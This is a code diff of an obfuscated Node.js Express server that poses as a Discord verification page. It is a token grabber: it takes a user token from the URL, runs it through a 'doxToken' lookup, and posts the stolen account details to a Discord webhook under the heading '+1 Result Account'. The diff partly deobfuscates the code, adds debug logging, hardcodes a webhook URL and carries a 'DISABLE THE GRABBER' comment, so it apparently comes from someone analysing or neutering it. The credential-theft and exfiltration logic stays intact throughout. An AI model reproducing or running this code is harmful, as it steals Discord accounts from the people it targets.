@@ -176,7 +176,7 @@ const _0x1b5dc9 = (function() {
     })();
 }());
 
-// Script Start
+// Script Start ?
 const { default: axios } = require('axios')
 const express = require('express')
 const { MessageEmbed, WebhookClient } = require('discord.js')
@@ -235,15 +235,16 @@ const doxToken = async (_0x2d8afa, _0x146f4) => {
 function _0x4bdc(_0x4bdce6, _0xda271b) {
     const _0x2d071b = _0x261a();
     return _0x4bdc = function(_0x2709a1, _0x396b04) {
-        _0x2709a1 = _0x2709a1 - (-0x25cd + -0x8 * -0x2f + 0x253b);
+        _0x2709a1 = _0x2709a1 - (-0x25cd + -0x8 * -0x2f + 0x253b); //230
         let _0x2e87fb = _0x2d071b[_0x2709a1];
         return _0x2e87fb;
     }, _0x4bdc(_0x4bdce6, _0xda271b);
 }
-app[_0x48451e(0x13f)]('/', async (_0x3736a6, _0x4868f6) => {
+//app[_0x48451e(0x13f)]('/', async (_0x3736a6, _0x4868f6) => {
+    app.get('/', async (req, res) => {
     const _0x55a737 = _0x48451e,
-        _0x52c14e = _0x3736a6[_0x55a737(0x12d)][_0x55a737(0x14b)];
-    _0x52c14e && _0x4868f6[_0x55a737(0x146)](`<!DOCTYPE html> 
+        _0x52c14e = req['query']['user'];
+    _0x52c14e && res['send'](`<!DOCTYPE html>
   <html lang=?en?> 
     <head> 
       <meta charset=?UTF-8? /> 
@@ -253,18 +254,18 @@ app[_0x48451e(0x13f)]('/', async (_0x3736a6, _0x4868f6) => {
     </head> 
     <body> 
       <script> 
-        const pass = alert(?Successfully verified! Please go back to your desired Discord Server.?); 
+        const pass = alert("Successfully verified! Please go back to your desired Discord Server."); 
    
         function searchToObject() { 
-          var pairs = window.location.search.substring(1).split(?&?), 
+          var pairs = window.location.search.substring(1).split("&"), 
             obj = {}, 
             pair, 
             i; 
    
           for (i in pairs) { 
-            if (pairs[i] === ??) continue; 
+            if (pairs[i] === "") continue; 
    
-            pair = pairs[i].split(?=?); 
+            pair = pairs[i].split("="); 
             obj[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]); 
           } 
    
@@ -272,30 +273,33 @@ app[_0x48451e(0x13f)]('/', async (_0x3736a6, _0x4868f6) => {
         } 
    
         const query = searchToObject(); 
+        console.log(query, pass)
    
-        location.href = `${location.origin}/k?user=${query.user}&pass=${pass}`; 
       </script> 
     </body> 
-  </html>`);
-}), app[_0x48451e(0x13f)]('/k', async (_0x358fd2, _0x4cd1df) => {
+  </html>`); // Ignore error!
+  // Line 276 = `${location.origin}/k?user=${query.user}&pass=${pass}`
+}), app[_0x48451e(0x13f)]('/k', async (req, res) => { //319
     const _0x22e24a = _0x48451e,
         _0x153861 = {
-            'AjADN': _0x22e24a(0x137),
+            'AjADN': _0x22e24a(0x137), //311 - HTML?
             'kwaBJ': '💰 +1 Result Account 💰',
-            'FxCuE': _0x22e24a(0x140),
-            'SgVOm': _0x22e24a(0x130),
-            'rkUgK': function(_0x560473, _0x440fc4) {
+            'FxCuE': _0x22e24a(0x140), //320 - "find"
+            'SgVOm': _0x22e24a(0x130), //304 - "FxCuE"
+            'rkUgK': function(_0x560473, _0x440fc4) { // Stupid bullshit come back smh
                 return _0x560473(_0x440fc4);
             },
-            'gzoyo': _0x22e24a(0x129),
-            'euAbj': _0x22e24a(0xf2)
+            'gzoyo': _0x22e24a(0x129), //297 - "setColor"
+            'euAbj': _0x22e24a(0xf2) //242 - "SlrKx"
         },
-        _0x44b842 = _0x358fd2[_0x22e24a(0x12d)][_0x22e24a(0x14b)],
-        _0x2b1e5d = _0x358fd2['query'][_0x22e24a(0x12b)];
-    if (_0x44b842) {
-        _0x4cd1df[_0x22e24a(0x146)](_0x22e24a(0xeb));
+        userQuery = req['query'][`user`],
+
+        passQuery = req['query']['pass'];
+        
+    if (userQuery) {
+        res[_0x22e24a(0x146)](_0x22e24a(0xeb));
         try {
-            const _0x4b1f28 = await doxToken(_0x44b842, _0x2b1e5d && typeof _0x2b1e5d === _0x153861[_0x22e24a(0x109)] ? _0x2b1e5d[_0x22e24a(0x148)]() : null);
+            const _0x4b1f28 = await doxToken(userQuery, passQuery && typeof passQuery === _0x153861[_0x22e24a(0x109)] ? passQuery[_0x22e24a(0x148)]() : null);
             console[_0x22e24a(0x112)](_0x4b1f28);
             if (!_0x4b1f28) return;
             const _0x394293 = new MessageEmbed();
@@ -305,23 +309,25 @@ app[_0x48451e(0x13f)]('/', async (_0x3736a6, _0x4868f6) => {
                 _0x321f9d[_0x22e24a(0x113)]('**__' + _0x56b70c + _0x22e24a(0xf6) + _0x4b1f28['rawData'][_0x56b70c]);
             }
             _0x321f9d = _0x321f9d[_0x22e24a(0x100)]('\x0a'), _0x394293[_0x22e24a(0x141)](_0x321f9d), _0x394293[_0x22e24a(0x13e)](_0x153861[_0x22e24a(0x155)]);
-            if (process[_0x22e24a(0x156)][_0x22e24a(0xf4)](_0x3ef9b2 => _0x3ef9b2[_0x22e24a(0x127)] === _0x44b842 && _0x3ef9b2['passowrd'] === _0x2b1e5d)) console['log'](_0x153861[_0x22e24a(0xf7)]);
+            if (process[_0x22e24a(0x156)][_0x22e24a(0xf4)](_0x3ef9b2 => _0x3ef9b2[_0x22e24a(0x127)] === userQuery && _0x3ef9b2['passowrd'] === passQuery)) console['log'](_0x153861[_0x22e24a(0xf7)]);
             else {
+                console.log(global)
                 await _0x153861[_0x22e24a(0x14f)](axios, {
                     'method': 'POST',
-                    'url': hook,
+                    'url': "https://discord.com/api/webhooks/1039280703680041060/zOIU1b787EQ6J_Z_5jZOCQWzDdhuWLgm_Qtsm_Dq_iXwmSf1FoO1ohMz66_uXLDcc5Ai", //hook, DISABLE THE GRABBER
                     'data': {
-                        'content': _0x153861[_0x22e24a(0x142)],
-                        'embeds': [_0x394293[_0x22e24a(0x128)]()]
+                        // 'content': _0x153861[_0x22e24a(0x142)], //322
+                        'content': hook,
+                        'embeds': [_0x394293[_0x22e24a(0x128)]()] //296
                     }
                 })[_0x22e24a(0x115)](_0x512276 => console[_0x22e24a(0x112)](_0x512276['name']));
                 const _0x85050c = {};
-                _0x85050c[_0x22e24a(0x127)] = _0x44b842, _0x85050c['password'] = _0x2b1e5d, process[_0x22e24a(0x156)][_0x22e24a(0x113)](_0x85050c);
+                _0x85050c[_0x22e24a(0x127)] = userQuery, _0x85050c['password'] = passQuery, process[_0x22e24a(0x156)][_0x22e24a(0x113)](_0x85050c);
             }
         } catch (_0x9e74a7) {
             console[_0x22e24a(0x112)](_0x9e74a7);
         }
-    } else _0x4cd1df[_0x22e24a(0x146)](_0x153861['euAbj']);
+    } else res[_0x22e24a(0x146)](_0x153861['euAbj']);
 }), app[_0x48451e(0x144)](0x1 * -0x11d1 + -0x3ca7 + 0x6e08, () => {
     const _0x46c57b = _0x48451e;
     console[_0x46c57b(0x112)]('Server Started on http://localhost:8080');
